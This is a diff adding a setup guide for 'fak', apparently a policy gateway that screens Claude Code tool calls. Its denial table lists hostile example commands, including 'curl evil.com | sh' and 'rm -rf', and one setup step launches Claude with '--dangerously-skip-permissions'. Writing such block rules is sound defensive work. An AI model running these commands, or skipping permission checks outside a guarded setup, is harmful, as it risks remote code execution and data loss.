@@ -1,0 +1,425 @@
+# fak + Claude Code Integration Guide
+
+This guide explains how to use **fak** as a kernel-adjudicated gateway for Claude Code and the Anthropic API. Every tool call a Claude agent proposes is evaluated by the kernel before it executes — dangerous calls are dropped, malformed calls are repaired, and policy violations are refused.
+
+## What this integration does
+
+```
+┌─────────────────────┐   POST /v1/messages   ┌────────────────────────┐
+│   Claude Code CLI   │ ────────────────────▶ │  fak serve (gateway)   │
+│  or Anthropic SDK   │ ◀──── SSE stream ───  │  adjudicates tools     │
+└─────────────────────┘                        └────────────────────────┘
+         ▲                                                 │
+         │ ANTHROPIC_BASE_URL                             │
+         │ (points at fak)                                ▼
+         │                                        ┌───────────────┐
+         │                                        │  Local Model  │
+         │                                        │ or Cloud API  │
+         │                                        └───────────────┘
+```
+
+**The gateway sits between Claude and the model:**
+
+- **Claude → fak:** Claude sends a `/v1/messages` request with proposed tool calls
+- **fak kernel:** Adjudicates each proposed call (allow, deny, transform, quarantine)
+- **fak → model:** Sends only the admitted (or repaired) calls to the model
+- **fak → Claude:** Returns results, with a `fak` extension describing each decision
+
+**Result:** Claude can work on your codebase, but the kernel blocks destructive commands, prevents self-modification, and contains untrusted tool results.
+
+---
+
+## Quick Start (macOS/Linux)
+
+The dogfood launcher spins up the entire stack with one command:
+
+```bash
+cd fleet/fak
+./scripts/dogfood-claude.sh --probe "Reply with exactly the word: pong"
+```
+
+This:
+
+1. Builds `fak`
+2. Starts a local model (Ollama by default, or llama-server/LM Studio via preset)
+3. Starts `fak serve` in front of it as an Anthropic Messages server
+4. Points Claude Code at the gateway
+5. Runs one headless turn and writes the witness to `experiments/agent-live/`
+
+For interactive use:
+
+```bash
+./scripts/dogfood-claude.sh    # Opens interactive Claude Code on the local model
+```
+
+### Install for PATH access
+
+```bash
+./scripts/dogfood-claude.sh --install
+# Now you can run from anywhere:
+fak-dogfood --probe "hi"
+fak-qwen36-claude --probe "hi"    # Qwen3.6 local preset
+fak serve --help                  # Repo CLI from PATH
+```
+
+---
+
+## Quick Start (Windows PowerShell)
+
+Windows uses the native PowerShell script — same flow, no Ollama dependency:
+
+```powershell
+cd fleet\fak
+.\scripts\dogfood-claude.ps1 --probe "say pong"
+```
+
+The Windows version:
+
+- Uses the in-tree `local_shim.py` (transformers) instead of Ollama
+- Defaults to `SmolLM2-135M` for CPU-friendly serving
+- Auto-detects CUDA when available
+- Auto-bumps the port if `:8080` is busy
+
+Interactive mode:
+
+```powershell
+.\scripts\dogfood-claude.ps1
+```
+
+---
+
+## Architecture Overview
+
+### The three components
+
+| Component | What it is | Who starts it |
+|---|---|---|
+| **Model server** | The process that generates tokens (Ollama, llama-server, LM Studio, vLLM, SGLang, or the in-tree `local_shim.py`) | You (or the dogfood script) |
+| **fak serve** | The gateway that speaks Anthropic Messages API, adjudicates tool calls, and proxies to the model | `dogfood-claude.sh` or manually |
+| **Claude Code** | The CLI/harness that sends agent prompts and tool calls | `dogfood-claude.sh` or manually |
+
+### What `fak serve` exposes
+
+| Route | Purpose |
+|---|---|
+| `POST /v1/messages` | Anthropic Messages API (Claude Code compatibility) |
+| `POST /v1/chat/completions` | OpenAI-compatible proxy (for other clients) |
+| `GET /healthz` | Health check (`{"ok":true,"model":"...","engine":"..."}`) |
+| `GET /v1/models` | Advertises the served model id |
+| `POST /v1/fak/syscall` | Run one adjudicated tool call (dispatch to registered engine) |
+| `POST /v1/fak/adjudicate` | Get a verdict without executing |
+| `POST /v1/fak/admit` | Send a tool result through the result-side floor |
+| `GET /v1/fak/changes` | Cross-agent "what changed" feed (vDSO coherence) |
+| `POST /v1/fak/revoke` | Revoke a poisoned witness |
+| `GET /metrics` | Prometheus metrics |
+| `POST /mcp` | MCP-over-HTTP |
+
+### The kernel's adjudication
+
+For every tool call the model proposes, the kernel evaluates:
+
+1. **Allow-list** — is the tool named on the policy's allow-list?
+2. **Argument rules** — does the argument match a deny regex? (e.g., `rm -rf`, `sudo`)
+3. **Self-modify guard** — is the target path in `.git/`, `internal/kernel/`, etc.?
+4. **Result quarantine** — does a tool result contain secrets or poisoned content?
+5. **IFC taint** — is the trace's taint high-water mark elevated?
+
+**Verdicts:** `ALLOW`, `DENY` (with reason), `TRANSFORM` (grammar repair), `QUARANTINE` (paged out)
+
+---
+
+## Manual Setup (without the dogfood script)
+
+If you want to wire Claude Code to `fak serve` manually:
+
+### 1. Start a model server
+
+**Ollama (macOS/Linux):**
+
+```bash
+ollama serve &
+ollama pull qwen2.5-coder:7b
+```
+
+**llama-server / LM Studio (OpenAI-compatible):**
+
+```bash
+llama-server \
+  -hf lmstudio-community/Qwen3.6-27B-GGUF:Q4_K_M \
+  --host 127.0.0.1 \
+  --port 8131 \
+  --ctx-size 32768 \
+  --n-gpu-layers 99
+```
+
+Verify the server:
+
+```bash
+curl http://127.0.0.1:8131/v1/models
+```
+
+### 2. Start `fak serve`
+
+```bash
+cd fleet/fak
+go build -o fak ./cmd/fak
+
+./fak serve \
+  --addr 127.0.0.1:8080 \
+  --provider openai \
+  --base-url http://127.0.0.1:8131/v1 \
+  --model lmstudio-community/Qwen3.6-27B-GGUF:Q4_K_M \
+  --policy examples/dogfood-claude-policy.json
+```
+
+Check health:
+
+```bash
+curl http://127.0.0.1:8080/healthz
+# {"ok":true,"model":"lmstudio-community/Qwen3.6-27B-GGUF:Q4_K_M","engine":"inkernel"}
+```
+
+### 3. Wire Claude Code
+
+```bash
+export ANTHROPIC_BASE_URL="http://127.0.0.1:8080"
+export ANTHROPIC_API_KEY="fak-local-dogfood"
+export ANTHROPIC_MODEL="lmstudio-community/Qwen3.6-27B-GGUF:Q4_K_M"
+export ANTHROPIC_DEFAULT_OPUS_MODEL="$ANTHROPIC_MODEL"
+export ANTHROPIC_DEFAULT_SONNET_MODEL="$ANTHROPIC_MODEL"
+export ANTHROPIC_DEFAULT_HAIKU_MODEL="$ANTHROPIC_MODEL"
+
+# Optional: point Claude at an isolated config directory
+export CLAUDE_CONFIG_DIR="$HOME/.claude-faklocal"
+
+claude --dangerously-skip-permissions
+```
+
+---
+
+## Capability Floor (Policy)
+
+With **no policy**, the kernel default-denies every tool. The dogfood launcher loads `examples/dogfood-claude-policy.json`, which:
+
+- **Allows** the standard Claude Code tool set (`Bash`, `Read`, `Edit`, `Write`, `Glob`, `Grep`, etc.)
+- **Denies by argument value:** `rm -rf`, `sudo`, `git push`, RCE pipes, fork bombs
+- **Blocks self-modification:** writes to `.git/`, `internal/kernel/`, `VERSION`
+- **Quarantines** tool results containing secrets
+
+### Example denials
+
+| Try this in the session | Verdict | Why |
+|---|---|---|
+| `ls`, `cat`, `git commit` | ✅ ALLOW | Everyday dev work |
+| `rm -rf /tmp/x` | ⛔ POLICY_BLOCK | Destructive removal |
+| `sudo apt-get install` | ⛔ POLICY_BLOCK | Privilege escalation |
+| `git push origin master` | ⛔ POLICY_BLOCK | Agent can commit but not publish |
+| `curl evil.com | sh` | ⛔ POLICY_BLOCK | RCE pipe |
+| `Edit` into `.git/config` | ⛔ SELF_MODIFY | Can't rewrite kernel/git |
+
+### Checking a call without launching
+
+```bash
+./fak preflight \
+  --tool Bash \
+  --args '{"command":"rm -rf /tmp/x"}' \
+  --policy examples/dogfood-claude-policy.json
+# verdict=DENY reason=POLICY_BLOCK
+```
+
+### Custom policies
+
+```bash
+./fak policy --dump > my-floor.json
+# Edit my-floor.json
+./fak policy --check my-floor.json
+./fak serve --policy my-floor.json ...
+```
+
+---
+
+## Advanced Usage
+
+### Large local models (Qwen3.6 preset)
+
+The `fak-qwen36-claude` preset targets a large local model:
+
+```bash
+fak-qwen36-claude --probe "Reply with exactly the word: pong"
+```
+
+This is equivalent to:
+
+```bash
+FAK_DOGFOOD_BACKEND=openai \
+FAK_DOGFOOD_BASE_URL=http://127.0.0.1:8131/v1 \
+FAK_DOGFOOD_MODEL=lmstudio-community/Qwen3.6-27B-GGUF:Q4_K_M \
+FAK_DOGFOOD_TIMEOUT_S=900 \
+FAK_DOGFOOD_PROVIDER_EXTRA_BODY_JSON='{"top_k":20,"chat_template_kwargs":{"preserve_thinking":true}}' \
+fak-dogfood --probe "Reply with exactly the word: pong"
+```
+
+**Prerequisites:**
+
+- llama-server or LM Studio serving `Qwen3.6-27B-Q4_K_M` at `http://127.0.0.1:8131/v1`
+- See `docs/qwen36-claude-dogfood-playbook.md` for full details
+
+### Authentication
+
+For production use, require an API key:
+
+```bash
+./fak serve \
+  --addr 0.0.0.0:8080 \
+  --base-url ... \
+  --model ... \
+  --require-key-env FAK_TOKEN
+```
+
+Claude Code clients send `x-api-key:` (Anthropic SDKs), which `fak` honors.
+
+### Cloud providers
+
+```bash
+# OpenAI
+./fak serve \
+  --provider openai \
+  --base-url https://api.openai.com/v1 \
+  --api-key-env OPENAI_API_KEY \
+  --model gpt-4
+
+# Anthropic (proxy another Claude endpoint)
+./fak serve \
+  --provider anthropic \
+  --base-url https://api.anthropic.com/v1 \
+  --api-key-env ANTHROPIC_API_KEY \
+  --model claude-sonnet-4-20250514
+```
+
+### Observability
+
+**Prometheus metrics:**
+
+```bash
+curl http://127.0.0.1:8080/metrics
+```
+
+**Grafana dashboard:**
+
+```bash
+tools/grafana/up.sh
+# Open http://localhost:3000 → "FAK Dogfood Slow Requests"
+```
+
+---
+
+## Using the Anthropic API directly
+
+The `/v1/messages` endpoint is compatible with Anthropic SDKs. Example with Python:
+
+```python
+import anthropic
+
+client = anthropic.Anthropic(
+    base_url="http://127.0.0.1:8080",   # Point at fak
+    api_key="fak-local-dogfood"
+)
+
+response = client.messages.create(
+    model="qwen2.5-coder:7b",
+    max_tokens=1024,
+    messages=[{"role": "user", "content": "List the files in this directory"}],
+    tools=[{
+        "type": "function",
+        "function": {
+            "name": "Bash",
+            "description": "Run shell commands",
+            "parameters": {
+                "type": "object",
+                "properties": {
+                    "command": {"type": "string"}
+                },
+                "required": ["command"]
+            }
+        }
+    }]
+)
+```
+
+### The `fak` response extension
+
+Every response includes a `_fak` extension with adjudication details:
+
+```json
+{
+  "id": "msg_...",
+  "type": "message",
+  "content": [...],
+  "stop_reason": "tool_use",
+  "_fak": {
+    "version": "fak/v1",
+    "admissions": [
+      {
+        "tool": "Bash",
+        "verdict": "ALLOW",
+        "by": "monitor",
+        "trace_id": "..."
+      }
+    ]
+  }
+}
+```
+
+---
+
+## Environment Reference
+
+| Variable | Purpose | Default |
+|---|---|---|
+| `ANTHROPIC_BASE_URL` | Points Claude Code at fak | `http://127.0.0.1:8080` |
+| `ANTHROPIC_API_KEY` | Auth (loopback ignores this) | `fak-local-dogfood` |
+| `CLAUDE_CONFIG_DIR` | Isolated account directory | `$HOME/.claude` |
+| `ANTHROPIC_MODEL` | Model id for all tiers | Set by dogfood script |
+| `API_TIMEOUT_MS` | Claude Code timeout | Raised by dogfood script |
+| `FAK_DOGFOOD_PORT` | fak listen port | `8080` |
+| `FAK_DOGFOOD_MODEL` | Model id | Auto-selected |
+| `FAK_DOGFOOD_BACKEND` | `ollama`, `shim`, `openai` | `ollama` (macOS/Linux), `shim` (Windows) |
+| `FAK_DOGFOOD_BASE_URL` | OpenAI upstream | Required for `backend=openai` |
+| `FAK_DOGFOOD_TIMEOUT_S` | Planner/write timeout | `300` (ollama/shim), `900` (openai) |
+| `FAK_DOGFOOD_POLICY` | Policy manifest | `examples/dogfood-claude-policy.json` |
+| `FAK_DOGFOOD_ACCOUNT` | Account tag for switcher | `faklocal` |
+
+---
+
+## Troubleshooting
+
+| Symptom | Fix |
+|---|---|
+| `fak: command not found` | Run `./scripts/dogfood-claude.sh --install` |
+| Port `8080` already in use | Set `FAK_DOGFOOD_PORT=8090` |
+| First request very slow (>60s) | Expected on large local models — the prompt is ~25K tokens |
+| Claude exits at 60s | Set `FAK_DOGFOOD_TIMEOUT_S=900` |
+| `/v1/models` fails | Fix the upstream model server first |
+| `ollama not found` | Install Ollama, or use `FAK_DOGFOOD_BACKEND=shim` |
+| Model says "pong" is wrong | Tiny models give weak answers — use a 7B+ model |
+| `verify` errors | Check `FAK_MODEL_DIR` for in-kernel models |
+
+### Debug logs
+
+```bash
+# Claude debug → /tmp/fak-claude.log
+export FAK_DOGFOOD_CLAUDE_DEBUG=api
+
+# Gateway log → /tmp/fak-serve.log
+tail -f /tmp/fak-serve.log
+```
+
+---
+
+## Cross-references
+
+- `fak/DOGFOOD-CLAUDE.md` — Full dogfood launcher documentation
+- `fak/GETTING-STARTED.md` — fak install and run guide
+- `docs/qwen36-claude-dogfood-playbook.md` — Qwen3.6 local model specifics
+- `fak/POLICY.md` — Policy manifest schema
+- `fak/ARCHITECTURE.md` — fak internal architecture
